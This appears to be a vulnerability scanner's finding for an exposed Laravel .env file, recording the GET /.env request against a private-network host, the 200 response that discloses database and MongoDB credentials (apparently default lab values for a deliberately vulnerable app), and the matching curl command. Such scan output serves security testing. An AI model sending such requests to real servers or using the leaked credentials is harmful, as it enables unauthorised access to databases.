info.name: Laravel - Sensitive Information Disclosure
author: pxmme1337
dwisiswant0
geeknik
emenalf
adrianmf
info.description: A Laravel .env file was discovered, which stores sensitive information like database credentials and tokens. It should not be publicly accessible.

request:
GET /.env HTTP/1.1
Host: 192.168.1.106:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK
Content-Length: 201
Accept-Ranges: bytes
Connection: keep-alive
Content-Type: application/octet-stream
Date: Mon, 13 Jul 2026 06:09:12 GMT
Etag: "68d18f7b-c9"
Last-Modified: Mon, 22 Sep 2025 18:03:39 GMT
Server: openresty/1.27.1.2

DB_NAME=crapi
DB_USER=crapi
DB_PASSWORD=crapi
DB_HOST=postgresdb
DB_PORT=5432
SERVER_PORT=8080
MONGO_DB_HOST=mongodb
MONGO_DB_PORT=27017
MONGO_DB_USER=crapi
MONGO_DB_PASSWORD=crapi
MONGO_DB_NAME=crapi
curl-command: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0' 'http://192.168.1.106:8888/.env'
